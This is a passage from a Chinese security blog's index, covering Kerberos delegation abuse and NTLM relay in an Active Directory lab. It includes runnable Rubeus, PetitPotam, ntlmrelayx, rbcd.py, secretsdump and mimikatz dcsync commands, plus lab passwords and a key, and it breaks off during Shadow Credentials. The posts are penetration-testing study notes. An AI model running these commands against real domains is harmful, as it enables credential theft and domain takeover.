[{"categories":["AD域"],"content":"本文记录学习Kerberos认证和委派相关的知识和攻击手法，由于原理很复杂，所以不敢保证自己能讲明白。尽力😥。 注： 本文中 TGS = 服务票据ST ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:0:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"Kerberos ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:1:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"简介 Kerberos是一种由MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证。 在Kerberos协议中主要是有三个角色的存在： 提供服务的Server(如HTTP服务，MSSQL服务等) KDC（Key Distribution Center）密钥分发中心，默认安装在域控（Domain Controller）中。KDC包含下面三个角色 Authentication Service: 为client生成TGT的服务 Ticket Granting Service: 为client生成某个服务的TGS（ticket） Account Database:一个类似于本机SAM的一个数据库。存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。 PAC (Privileged Attribute Certificate) 特权属性证书保护 功能，PAC主要是规定服务器将票据发送给kerberos服务，由 kerberos服务验证票据是否有效。 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:1:1","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"认证流程 参考自daiker、倾旋、 JD.Army AS_REQ: Client向KDC发起AS_REQ,请求凭据包含用户名，用户的NTLM Hash加密的时间戳，到期时间等信息。 AS_REP: KDC根据用户名在Accout Database中查找用户对应的NTLM Hash进行解密，如果结果正确则第一步认证通过。随后KDC生成随机字符串Session Key，使用用户NTLM Hash加密Session Key作为AS_REP返回，同时返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组以及Session Key。 TGS_REQ: Client凭借TGT票据与使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。向KDC发起针对特定服务的TGS_REQ请求。 TGS_REP: KDC使用krbtgt hash对TGT进行解密得到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信，如果结果正确，就会生成一个新的Session Key，我们称之为Server Session Key，这个Server Session Key主要用于和服务器进行通信。返回信息包括Session Key加密的Server Session Key和用Server Hash加密PAC、Server Session Key和客户端信息的ST票据（ticket）(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回ST票据) AP_REQ: Client拿着ST票据（包含PAC）和Server Session Key加密的客户端信息与时间戳去请求服务。 AP_REP: 服务使用自己的hash解密ST票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:1:2","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"图解 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:1:3","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"S4U扩展协议 包括s4u2self和s4u2proxy。 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:2:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"s4u2self 他其实是一次TGS认证的阶段。服务A代替用户请求一张针对服务A本身的服务票据ST。生成的服务票据一般是用于后面的s4u2proxy认证阶段。 之所以有这个阶段，是为了兼容其他不通过Kerberos认证的登录方式，比如用户通过SSO统一登录、或者通过NTLM认证。这是一个协议转换的过程。 服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的。 获取可转发票据的前提： 机器被配置了约束性委派 用户没有设置 敏感账户，不能被委派 用户不是受保护用户组的成员 即使机器没有被配置约束委派，也就是用户的UserAccountControl位没有TrustedToAuthForDelegation 属性。 s4u2self依然可以请求到服务票据，只不过这个服务票据不可转发。这种情况适用于基于资源的约束委派RBCD。 被委派的用户配置了敏感用户不能被委派，s4u2self返回不可转发票据。不可用于s4u2proxy（CVE-2020-17049绕过），但可用于s4u2self提权。 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:2:1","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"s4u2proxy 服务A拿着s4u2self阶段请求的服务票据ST去请求另一个服务B的服务票据。 S4U2Proxy 总是产生一个可转发的 TGS，即使请求中提供的额外 TGS 是不可转发的。 https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.htmlimage.png \" https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html 有个点需要注意的是，前面在S4U2SELF里面提到，在满足一定的条件之后，S4U2SELF返回的票据是可以转发的，这个票据作为S4U2PROXY的AddtionTicket，有些文章里面会说，S4U2PROXY要求AddtionTicket里面的票据一定要是可转发的，否则S4U2PROXY生成的票据是不可以转发的。这个说法在引入可资源约束委派的情况下，是不成立的。（TGS_REQ \u0026 TGS_REP - windows protocol） ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:2:2","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"非约束委派 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:3:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"介绍 Windows 2000引进非约束委派。 配置非约束委派需要SeEnableDelegation权限。这个权限通常只授予域管理员。 被配置了非约束性委派的机器。其他用户（比如说域管）访问这台机器时，会携带该用户的TGT。并将TGT缓存进非约束委派机器lsass内存中。如下图， 正常未被配置委派的机器lsass内存中只有服务票据ST。 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:3:1","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"利用 配置了非约束委派的用户的userAccountControl属性有个FLAG位TrustedForDelegation。 查询非约束委派用户 AdFind.exe -b \"DC=adc,DC=com\" -f \"(\u0026(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" cn distinguishedName 查询非约束委派机器 AdFind.exe -b \"DC=adc,DC=com\" -f \"(\u0026(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" cn distinguishedName 由于用户访问非约束委派主机会自动留下自己的TGT，所以利用思路一般是： 诱导域管访问该主机。从而获取域管TGT。 结合打印机bug或者Petitpotam强制域内机器访问该主机。 第二种方法有一个经典攻击场景：跨域 因为域控默认是非约束委派。且父域和子域之间默认是双向信任关系。所以当我们拿下一台子域控后。可以通过PetitPotam强制父域控访问子域控从而获得父域控机器账户TGT。然后进行dcsync父域。 需要注意一个细节的是使用打印机bug或者Petitpotam时要使用host不要用ip。否则会失败。 Rubeus监听 .\\Rubeus.exe monitor /interval:1 /filteruser:DC01$ python3 PetitPotam.py WEB2 10.10.10.10 PTT然后dcsync ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:3:2","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"约束性委派 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:4:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"介绍 Windows 2003引入了约束性委派 配置约束性委派也需要SeEnableDelegation权限。 具体过程是收到用户的请求之后，首先代表用户获得针对服务自身的可转发的kerberos服务票据(S4U2SELF)，拿着这个票据向KDC请求访问特定服务的可转发的TGS(S4U2PROXY)，并且代表用户访问特定服务，而且只能访问该特定服务。 相较于非约束委派，约束委派最大的区别也就是配置的时候选择某个特定的服务，而不是所有服务。 参照下图，serviceA在S4U2proxy阶段需要一张用户的TGS（服务票据ST），这个TGS可以是serviceA通过s4u2self得到，也可以是用户直接访问serviceA得到。 https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.htmlimage.png \" https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:4:1","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"利用 配置了约束委派的用户的userAccountControl属性有个FLAG位TrustedToAuthForDelegation。 并且还有个msDS-AllowedToDelegateTo属性，他的值是允许访问的服务。也就是配置约束委派我们指定的特定服务。 查询约束性委派用户 AdFind.exe -b \"DC=adc,DC=com\" -f \"(\u0026(samAccountType=805306368)(msds-allowedtodelegateto=*))\" cn distinguishedName msds-allowedtodelegateto 查询约束性委派机器 AdFind.exe -b \"DC=adc,DC=com\" -f \"(\u0026(samAccountType=805306369)(msds-allowedtodelegateto=*))\" cn distinguishedName msds-allowedtodelegateto 拿下一个约束委派主机后，我们就可以模拟任意用户访问该主机允许的服务（msDS-AllowedToDelegateTo）。感觉这部分和RBCD有些重复，不再演示。重点在RBCD。 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:4:2","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"基于资源的约束性委派 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:5:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"介绍 基于资源的约束性委派又名RBCD。 配置约束性委派和非约束性委派都需要SeEnableDelegation权限。而这个权限一般只有域管才有。为了赋予用户更大的灵活性，微软在Windows server 2012中引进基于资源的约束性委派。 基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用。 配置基于资源的约束性委派，无需SeEnableDelegation权限，只需要对机器具有写属性权限（WriteProperty）。即可配置。 msDS-AllowedToDelegateTo 变成了 msDS-AllowedToActOnBehalfOfOtherIdentity。但是方向相反。参照下图。 也就是说，serviceB上配置msDS-AllowedToActOnBehalfOfOtherIdentity的值为serviceA。那么serviceB就信任来自serviceA的委派。也就是下图的传出信任与传入信任。 https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.htmlimage.png \" https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html 服务A代表用户申请一个获得针对服务A自身的kerberos服务票据、这一步就是S4U2SELF，这一步就区别传统的约束委派，在S4U2SELF里面提到，返回的TGS可转发的一个条件是服务A配置了传统的约束委派，kdc会检查服务A 的TrustedToAuthForDelegation位和msDS-AllowedToDelegateTo 这个字段，由于基于资源的约束委派，是在服务B配置，服务B的msDS-AllowedToActOnBehalfOfOtherIdentity属性配置了服务A的sid，服务A并没有配置TrustedToAuthForDelegation位和msDS-AllowedToDelegateTo 字段。因此这一步返回的TGS票据是不可转发的。 （TGS_REQ \u0026 TGS_REP - windows protocol） 也就是说传统的约束性委派在s4u2proxy阶段需要可转发的TGS。但是RBCD的不需要。 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:5:1","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"常规利用 Relay 自动创建一个机器账户，密码随机。需要ldaps。 python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --remove-mic --delegate-access -smb2support 指定机器账户 python3 ntlmrelayx.py -t ldap://10.10.10.10 -debug --remove-mic --delegate-access --escalate-user testpc\\$ python3 getST.py -impersonate 'administrator' -spn 'cifs/WEB2.adc.com' -dc-ip 10.10.10.10 'adc.com/USCJNQTK\\$:' export KRB5CCNAME=administrator.ccache python3 psexec.py -no-pass -k 'adc.com/administrator@web2.adc.com' 计算hash .\\Rubeus.exe hash /domain:adc.com /user:USCJNQTK$ /password:\"iJ'vp3V\u003e'4De}tf\" 请求st .\\Rubeus.exe s4u /user:USCJNQTK$ /aes256:64033274241a7f086ce4254fc8a46072810c021013a546c807bad5421d33f7b6 /impersonateuser:Administrator /msdsspn:host/web2.adc.com /altservice:cifs /domain:adc.com /nowrap /ptt .\\Rubeus.exe s4u /user:USCJNQTK$ /aes256:64033274241a7f086ce4254fc8a46072810c021013a546c807bad5421d33f7b6 /impersonateuser:Administrator /msdsspn:host/web2.adc.com /altservice:cifs /domain:adc.com /nowrap /ptt 加域账户 当一个用户给一台机器加域后，该用户就对该机器具有写属性权限（WriteProperty）。而企业中往往都会有一个专门的加域用户，当我们拿到了这个加域用户的凭据后，我们就可以通过RBCD控制由该用户加入域内所有机器的权限。 首先假设我们抓到了加域账户（join）的哈希或密码。 python3 rbcd.py -delegate-to 'web2' -action read 'adc.com/join:song@2020' -dc-ip 10.10.10.10 python3 rbcd.py -delegate-to 'web2' -delegate-from USCJNQTK -action write 'adc.com/join:song@2020' -dc-ip 10.10.10.10 python3 rbcd.py -delegate-to 'web2' -action read 'adc.com/join:song@2020' -dc-ip 10.10.10.10 python3 getST.py -impersonate 'administrator' -spn 'cifs/WEB2.adc.com' -dc-ip 10.10.10.10 'adc.com/USCJNQTK\\$:' 导入票据后使用psexec等工具即可获得该机器的SYSTEM权限。这也是一种提权的过程。（join账户 -\u003e SYSTEM）。 同样，域内Accout Operators 组的成员对域内机器有写属性权限。假设我们拿到的机器登录的用户是Accout Operators 组的成员。同样可以通过RBCD的方式拿到该机器的SYSTEM权限。 RBCD提权方式有很多，下篇文章专门讲解。 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:5:2","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"其他攻击面 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:6:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"变种黄金票据 这里也很好理解。我们通过s4u2self代表域管administrator申请一张访问自身的服务票据TGS。再拿着这张TGS通过s4u2proxy去访问服务krbtgt/adc.com。那么这张票据不就是域管的TGT吗。 类似这样的结构：这种手法通过约束委派或者RBCD都可以实现。 我们修改一个配置约束委派机器的msDS-AllowedToDelegateTo属性为krbtgt/adc.com。 或者设置krbtgt的msDS-AllowedToActOnBehalfOfOtherIdentity属性为我们添加的机器。 再通过S4U协议即可获得一张域管的TGT。 具体参考： 利用 Kerberos delegation 打造变种黄金票据 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:6:1","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"CVE-2020-17049 在s4u2self阶段我们提到，获取可转发的票据，需要 机器配置了约束委派 用户没有设置 ‘敏感账户，不能被委派’ 用户不是受保护组的成员 我们给administrator配置敏感账户。 在s4u2proxy阶段申请服务票据时报错。 加上-force-forwardable成功。 为什么呢？ 票据中的forwardable位标志着该票据是否可转发。我们看一下KDC验证forwardable的流程： s4u2self阶段：KDC会检查机器是否配置委派、敏感用户和是否是受保护组成员 不满足上述条件forwardable位就被设为0。而s4u2self阶段的的forwardable位是通过server本身的hash加密的，这就导致了我们可以解密并把forwardable位改为1。这样后续s4u2proxy校验KDC就认为委派的用户不受保护。 那么这里就有一个问题。我们知道RBCD时s4u2self阶段申请的票据不一定是可转发的。而且多数情况下是不可转发的。那么s4u2proxy阶段KDC的验证顺序是怎么样的呢。 Rubeus有专门得s4u模块 GhostPack/Rubeus: Trying to tame the three-headed dog. (github.com) 以下是我个人测试结果，不一定对： s4u2proxy阶段： forwardable = 1： KDC首先确定两者是否存在委派关系(首先检查是否存在A-\u003eB的约束委派，不存在则检查是否存在B-\u003eA的RBCD)。若不存在委派关系，报错返回。 forwardable = 0： 首先检查是否存在B-\u003eA的RBCD，如果二者存在RBCD，会进一步检查用户是否配置了不可委派或者是受保护组的,若不是s4u2proxy依然可用。 这里根据我本地的测试结果。KDC检查用户是否配置了不可委派时是在TGS-REQ请求中的PAC中检查的。 这也就是说以下攻击顺序是可行的（感觉也没啥实际价值）： s4u2self申请administrator的TGS。 设置administrator为委派账户不可委派。 使用上面申请的TGS进行s4u2proxy。 成功获取票据。 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:6:2","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"s4u2self提权 假设我们拿到一台机器权限是一些服务账户的，比如NT AUTHORITY\\NETWORK SERVICE、iis apppool\\defaultapppool nt service\\mssqlserver这类权限在访问网络资源时是通过机器账户去访问的。 而任意机器账户都已进行s4u2self获得一张任意用户访问自身的服务票据。即使这张票据不可转发、该用户在受保护组中，票据依然可用。 示例： 首先我们上线了一台mssql的机器，权限是mssqlservice。 执行s4u2self之前，我们需要一张机器账户的TGT或者hash。 Rubeus - 现在拥有更多的Kekeo功能 - 安全客，安全资讯平台 (anquanke.com) 通过Rubeus的tgtdeleg功能获取一张机器账户的TGT。 然后通过s4u2self代替域管获取mssql的服务票据 然后转换票据，票据传递。获得system权限。 与白银银票相比，它的优势在于生成的票据包含有效的 PAC。 ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:6:3","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["AD域"],"content":"参考 revisiting-delegate-2-thyself Abusing Kerberos S4U2self for local privilege escalation windows protocol Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory 微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato） - 奇安信A-TEAM技术博客 (qianxin.com) ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:7:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":null,"content":"最开始看不懂的文章，过了一段时间的学习后再回来看总会有种恍然大悟的感觉。 记录自己看过的没看过的的文章，以便日后回顾。 让子弹飞一会！ AD域 windows protocol NTLM - The Hacker Recipes Penetration Testing Lab – Offensive Techniques \u0026 Methodologies NTLM Relay - hackndo Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory | Shenanigans Labs 【M01N】资源约束委派和NTLM Relaying的组合拳接管域内任意主机系统权限 – 绿盟科技技术博客 Exploring search connectors and library files in Windows Windows访问控制 - Windows Access Control AD域中的ACL攻防探索 - 安全客，安全资讯平台 这是一篇“不一样”的真实渗透测试案例分析文章 - 奇安信A-TEAM技术博客 微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato） - 奇安信A-TEAM技术博客 Project Zero: Using Kerberos for Authentication Relay Attacks 结合CVE-2019-1040漏洞的两种域提权深度利用分析 - FreeBuf网络安全行业门户 Abusing AD ACL - 先知社区 渗透测试中的Exchange - 安全客，安全资讯平台 Relaying NTLM authentication over RPC again… – Compass Security Blog AD CS攻击面剖析 - FreeBuf网络安全行业门户 ADCS 攻击面挖掘与利用 - 安全客，安全资讯平台 免杀 What is ired.team? - Red Teaming Experiments 前言 - Cobalt Strike 基于rpc调用-动态加载ssp_rv0p111-CSDN博客 对抗360权限维持 – xkkhh’s blog 利用VEH做内存对抗 - 先知社区 绕过卡巴斯基dump进程lsass.exe内存_xiangshen1990的博客-CSDN博客_dump lsass DLL注入新姿势：反射式DLL注入研究 - h2z - 博客园 Bypassing Signature-Based AV | Red Siege Information Security 其他 CDN 2021 完全攻击指南 （一） - 安全客，安全资讯平台 ","date":"2022-02-18","objectID":"https://songzhiv.github.io/cl/:0:0","tags":null,"title":"","uri":"https://songzhiv.github.io/cl/"},{"categories":["AD域"],"content":"本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读以下世纪好文： The NTLM Authentication Protocol and Security Support Provider NTLM 篇 - windows protocol NTLM Relay - hackndo 本篇主要围绕下图进行。来自 https://www.thehacker.recipes/ad/movement/ntlm/relayNTLM relay.drawio.png \" https://www.thehacker.recipes/ad/movement/ntlm/relay ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:0:0","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"触发NTLM认证。 ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:1:0","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"SMB PetitPotam（MS-EFSR） https://github.com/topotam/PetitPotam MS-EFSR 是 Microsoft 的加密文件系统远程协议。它对远程存储并通过网络访问的加密数据执行维护和管理操作，并可作为 RPC 接口使用。该接口可通过 \\pipe\\efsrpc、\\pipe\\lsarpc、\\pipe\\samr、\\pipe\\lsass 和 \\pipe\\netlogon SMB 命名管道使用。 MS-efs触发机器账户强制返回身份验证。默认走SMB协议。 如果机器开启lsarpc的匿名访问。即可在不知道账户密码的情况下触发强制身份认证。 dasimage.png \" das PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py Microsoft 的 Print Spooler 是一项处理打印作业和其他与打印相关的各种任务的服务。控制域用户/计算机的攻击者可以通过特定的 RPC 调用触发运行它的目标的假脱机服务，并使其对攻击者选择的目标进行身份验证。此缺陷是“无法修复”，默认情况下在所有 Windows 环境中启用。 强制身份验证通过 SMB 进行。 上面提到的“具体调用”就是 RpcRemoteFindFirstPrinterChangeNotificationEx 通知方法，它是 MS-RPRN 协议的一部分。 MS-RPRN 是 Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间的打印作业处理和打印系统管理的通信。 ShadowCoerce (MS-FSRVP) MS-FSRVP 是 Microsoft 的文件服务器远程 VSS 协议。它用于在远程计算机上创建文件共享的卷影副本，并促进备份应用程序在 SMB2 共享 上执行应用程序一致的备份和数据恢复。 滥用的一个要求是在目标服务器上启用“文件服务器 VSS 代理服务”。 https://github.com/ShutdownRepo/ShadowCoerce python3 shadowcoerce.py -d \"adc.com\" -u \"mssql\" -p \"song@2020\" 10.10.10.123 10.10.10.15 Sql Server exec master.dbo.xp_dirtree '\\\\10.10.10.123\\test' 目标机器安装webclient时，可通过指定端口触发http类型认证。 exec master.dbo.xp_dirtree '\\\\kali@80/test' --http https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==\u0026mid=2247484864\u0026idx=1\u0026sn=94260cb4a4e643764f4cfd3565ae799b xp_dirtree '\\\\hostname@SSL\\test' --ssl 443 xp_dirtree '\\\\hostname@SSL@1234\\test' --ssl port 1234 xp_dirtree '\\\\hostname@1234\\test' --http ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:1:1","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"HTTP WEBDAV 在开启webclient（需要安装webdav，开启webclient）时，可结合PetitPotam 、PinterBug发出HTTP的认证 Installing WebDAV client on Windows Server 2016 – TheITBros 外发HTTP类型认证需要在可信域中，所以需要在域内添加一条DNS记录。或者端口转发域内机器 Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15 还有A-TEAM大哥们提到的WEBDAV XXE https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#41-webdav-xxe WPAD配合DHCPv6 https://daiker.gitbook.io/windows-protocol/ntlm-pian/5#0x09-wpad-he-mitm6 https://github.com/Kevin-Robertson/Inveigh https://www.bettercap.org/installation/ https://github.com/dirkjanm/mitm6 这里我使用物理机演示。 Inveigh.exe -spooferip 192.168.52.129 sudo python3 mitm6/mitm6.py -d adc.com --interface eth0 python3 ntlmrelayx.py -t ldap://10.10.10.10 -debug --remove-mic --delegate-access --escalate-user testpc\\$ -wh wpad -6 邮件钓鱼 outlook与foxmail 图片预览功能支持HTTP和UNC路径，可触发SMB和http类型认证。 获取HTTP需要在可信域，需要添加一条DNS记录。 XXE与SSRF https://daiker.gitbook.io/windows-protocol/ntlm-pian/5#0x0a-xxe-and-and-ssrf 各个语言触发XXE和SSRF的实现不同。同一门语言也有不同的触发方式， 只要支持UNC路径都能打回net-ntlm hash,如果支持http的话，得看底层实现，有些底层实现是需要判断是否在信任域的，有些底层实现是不需要判断是否信任域，有些需要判断是否信任域里面。 在xxe和ssrf测试中一般要测试这两个方面 支不支持UNC路径，比如\\\\ip\\x或者file://ip/x 支不支持HTTP(这个一般支持),是不是需要信任域，信任域是怎么判断的 Exchange SSRF https://daiker.gitbook.io/windows-protocol/ntlm-pian/7#4.-cve-2018-8581 ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:1:2","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"域内机器的签名情况 我们可以在 Windows管理工具-本地安全策略-本地策略-安全选项 中查看 ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:2:0","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"LDAP LDAP一般只安装在域控上，默认是协商签名而非强制签名。 即当relay时SMB签名开启或者强制签名时：需要签名 当SMB签名关闭（SMBv1）或者HTTP的流量时：不需要签名 ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:2:1","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"SMB 域控：作为server端，域控默认是强制SMB签名的。 域内普通机器：作为客户端，默认不开强制签名，默认为Enabled。 ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:2:2","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"Relay To？ ADC.com 10.10.10.10 域控 10.10.10.14 ADCS 10.10.10.16 Exchange 10.10.10.12 普通域内机器 DDC.com 10.10.10.20 域控 10.10.10.21 Exchange ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:0","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"ADCS ESC8 定位ADCS服务器： certutil -config - -ping 利用 python3 ntlmrelayx.py -t http://10.10.10.14/certsrv/certfnsh.asp -smb2support --adcs --template DomainController Rubeus.exe asktgt /user:WIN-8NUIJ5CPB71$ /certificate:base64cert /domain:adc.com /dc:10.10.10.10 /ptt mimikatz lsadump::dcsync /all ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:1","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"Cred Dump 敬请期待 https://github.com/SecureAuthCorp/impacket/pull/1253 ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:2","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"EXEC python3 ntlmrelayx.py -t smb://10.10.10.15 --remove-mic -c whoami ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:3","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"枚举信息 python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --dump-laps --dump-gmsa --remove-mic ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:4","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"创建用户（LDAPS） 添加机器账户 域有个属性ms-DS-MachineAccountQuota 他标志着非特权用户最多添加多少机器账户到域内。默认为10。 python3 ntlmrelayx.py -t ldaps://10.10.10.10 --add-computer testpc$ --remove-mic 添加普通用户 需要高权限账户（比如说域管）才可以， python3 ntlmrelayx.py -t ldaps://10.10.10.10 --remove-mic ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:5","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"Exchange LDAP 存在CVE-2019-1040漏洞的情况下，可以从SMB-\u003eLDAP(s)。而无需考虑签名的情况。 Exchange的机器账户是域内高权账户，对域有WriteDACL权限。即可以赋予任意用户两条ACE： 复制目录更改 复制目录更改所有项 这样该用户就具备了Dcsync权限，从而可以导出域内所有用户Hash。 当exchange存在SSRF漏洞(CVE-2018-8581)时。可触发http类型的NTLM认证。不需要考虑签名问题。 python3 privexchange.py -d ddc.com -u test1 -p song@2020 -ah 10.10.10.123 10.10.10.21 等待一分钟 没有SSRF时，可通过触发SMB类型流量结合CVE-2019-1040移除MIC完整型检验. python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --escalate-user wukong --remove-mic python3 secretsdump.py adc.com/wukong:song@2020@10.10.10.10 -dc-ip 10.10.10.10 -debug -just-dc-user krbtgt EWS Exchange的认证也是支持NTLM SSP的。我们可以relay到Exchange，从而收发邮件，代理等等。在使用outlook的情况下还可以通过homepage或者下发规则达到命令执行的效果。而且这种Relay还有一种好处，将Exchange开放在外网的公司并不在少数，我们可以在外网发起relay，而不需要在内网，这是最刺激的。(Net- NTLM 利用 - windows protocol) https://github.com/Arno0x/NtlmRelayToEWS ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:6","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"影子凭证（Shadow Credentials） 隐蔽权限维持。 常规Kerberos预认证阶段（pre-auth），客户端用自己的hash加密时间戳给KDC。KDC使用该用户的hash解密，验证通过后返回该用户的TGT。这是对称加密（DES、RC4、AES128、AES256）。Kerberos也支持非对称的认证方式，通过证书（PKINIT）或密钥对实现。需要安装ADCS。​ Microsoft 还引入了密钥信任的概念，以在不支持证书信任的环境中支持无密码身份验证。在 Key Trust 模型下，PKINIT 身份验证是基于原始密钥数据而不是证书建立的。 https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566abimage.png \" 